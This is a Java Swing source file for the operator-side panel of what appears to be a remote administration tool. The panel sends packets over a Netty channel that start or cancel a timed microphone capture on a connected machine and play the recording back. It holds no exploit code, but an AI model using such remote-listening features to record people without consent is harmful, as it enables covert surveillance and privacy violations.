/*
 * Copyright (c) 2021, 7ctx <https://github.com/7ctx/> 
 * Email: <7ctx@mail.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package com.ctx.server.ui.impl;

import com.protocol.packets.impl.RemoteMicrophoneCancelPacket;
import com.protocol.packets.impl.RemoteMicrophonePacket;
import com.ctx.server.ChannelHandler;
import io.netty.channel.ChannelId;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.Clip;
import javax.sound.sampled.LineUnavailableException;
import javax.swing.JOptionPane;
import lombok.Getter;
import lombok.Setter;
import lombok.extern.slf4j.Slf4j;

@Slf4j
public class RemoteMicrophoneUI extends javax.swing.JFrame 
{
    private javax.swing.JButton cancelButton;
    private javax.swing.JLabel minutesLabel;
    private javax.swing.JSlider minutesSlider;
    private javax.swing.JButton playButton;
    private javax.swing.JButton saveButton;
    private javax.swing.JButton startButton;
    
    @Getter
    @Setter
    private static javax.swing.JLabel statusLabel;
    
    private final ChannelId channelId;
    
    private Clip clip;
    
    public RemoteMicrophoneUI(ChannelId channelId) 
    {
        this.channelId = channelId;
                        
        try 
        {
            clip = AudioSystem.getClip();
        } 
        catch (LineUnavailableException ex) 
        {
            Logger.getLogger(RemoteMicrophoneUI.class.getName()).log(Level.SEVERE, null, ex);
        }
        
        initComponents();
    }
    
    /**
     * Elapsed time in seconds
     *
     * @param start
     * @return elapsed time in seconds
     */
    public long elapsedTime(long start) 
    {
        long now = System.currentTimeMillis();
        return (now - start) / 1000;
    }
    
     private void initComponents() 
     {
        minutesLabel = new javax.swing.JLabel();
        minutesSlider = new javax.swing.JSlider();
        startButton = new javax.swing.JButton();
        statusLabel = new javax.swing.JLabel();
        cancelButton = new javax.swing.JButton();
        playButton = new javax.swing.JButton();
        saveButton = new javax.swing.JButton();
        
        addWindowListener(new WindowAdapter() 
        {
            @Override
            public void windowClosing(WindowEvent e) 
            {
                RemoteMicrophonePacket.setCanceled(true);
                log.debug("RemoteMicrophonePacket is set to canceled");
                RemoteMicrophoneCancelPacket remoteMicrophoneCancelPacket = new RemoteMicrophoneCancelPacket();
                ChannelHandler.writePacket(channelId, remoteMicrophoneCancelPacket);
                dispose();
            }
        });

        setDefaultCloseOperation(javax.swing.WindowConstants.DISPOSE_ON_CLOSE);

        minutesLabel.setText("Start tap for minutes:");

        minutesSlider.setMajorTickSpacing(10);
        minutesSlider.setMaximum(60);
        minutesSlider.setMinorTickSpacing(1);
        minutesSlider.setPaintLabels(true);
        minutesSlider.setPaintTicks(true);
        minutesSlider.setSnapToTicks(true);
        minutesSlider.setToolTipText("");
        minutesSlider.setValue(1);
        
        statusLabel.setFont(new java.awt.Font("Dialog", 0, 14));
        statusLabel.setText("status:");
        
        startButton.setText("Start");
        startButton.addActionListener((java.awt.event.ActionEvent evt) -> 
        {
            int minutes = minutesSlider.getValue();
            if (minutes < 1) 
            {
                JOptionPane.showMessageDialog(rootPane, "Minutes must be above 0");
                return;
            }
            
              long startTime = System.currentTimeMillis();
              RemoteMicrophonePacket.setCaptureTime(minutes);
              RemoteMicrophonePacket.setCanceled(false);
              RemoteMicrophonePacket remoteMicrophonePacket = new RemoteMicrophonePacket();
              ChannelHandler.writePacket(channelId, remoteMicrophonePacket);
              statusLabel.setText("Capturing microphone for: " + minutes + " minutes..");
        });

         cancelButton.setText("Cancel");
         cancelButton.addActionListener((java.awt.event.ActionEvent evt) -> 
         {
             RemoteMicrophonePacket.setCanceled(true);
             log.debug("RemoteMicrophonePacket is set to canceled");
             RemoteMicrophoneCancelPacket remoteMicrophoneCancelPacket = new RemoteMicrophoneCancelPacket();
             ChannelHandler.writePacket(channelId, remoteMicrophoneCancelPacket);
             
             clip.drain();
             clip.stop();
             clip.close();
             statusLabel.setText("Status: capture canceled");
         });
        
        playButton.setText("Play");
        playButton.addActionListener((java.awt.event.ActionEvent evt) -> 
        {
            try 
            {
                if (RemoteMicrophonePacket.getAudioInputStream() == null) 
                {
                    JOptionPane.showMessageDialog(rootPane, "Wait till capture is finished");
                    System.out.println("Wait till capture is finished");
                    return;
                }
                
                if (clip.isRunning() || clip.isActive() || clip.isOpen()) 
                {
                    clip.drain();
                    clip.stop();
                    clip.close();
                    JOptionPane.showMessageDialog(rootPane, "Clip is already running");
                    return;
                } 
                clip.open(RemoteMicrophonePacket.getAudioInputStream());
                clip.start();
                statusLabel.setText("Status: Listening to capture..");
            }
            catch (LineUnavailableException | IOException ex) 
            {
                Logger.getLogger(RemoteMicrophoneUI.class.getName()).log(Level.SEVERE, null, ex);
            }
        });

        saveButton.setText("Save");

javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addContainerGap()
                        .addComponent(statusLabel, javax.swing.GroupLayout.PREFERRED_SIZE, 285, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addGroup(layout.createSequentialGroup()
                        .addGap(171, 171, 171)
                        .addComponent(minutesLabel))
                    .addGroup(layout.createSequentialGroup()
                        .addGap(178, 178, 178)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(cancelButton, javax.swing.GroupLayout.PREFERRED_SIZE, 96, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(startButton, javax.swing.GroupLayout.PREFERRED_SIZE, 96, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(playButton, javax.swing.GroupLayout.PREFERRED_SIZE, 96, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(saveButton, javax.swing.GroupLayout.PREFERRED_SIZE, 96, javax.swing.GroupLayout.PREFERRED_SIZE)))
                    .addGroup(layout.createSequentialGroup()
                        .addGap(81, 81, 81)
                        .addComponent(minutesSlider, javax.swing.GroupLayout.PREFERRED_SIZE, 307, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addContainerGap(108, Short.MAX_VALUE))
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addGap(31, 31, 31)
                .addComponent(minutesLabel)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(minutesSlider, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(18, 18, 18)
                .addComponent(startButton, javax.swing.GroupLayout.PREFERRED_SIZE, 24, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 12, Short.MAX_VALUE)
                .addComponent(cancelButton)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(playButton)
                .addGap(18, 18, 18)
                .addComponent(saveButton)
                .addGap(18, 18, 18)
                .addComponent(statusLabel, javax.swing.GroupLayout.PREFERRED_SIZE, 24, javax.swing.GroupLayout.PREFERRED_SIZE))
        );

        pack();
    }    
}
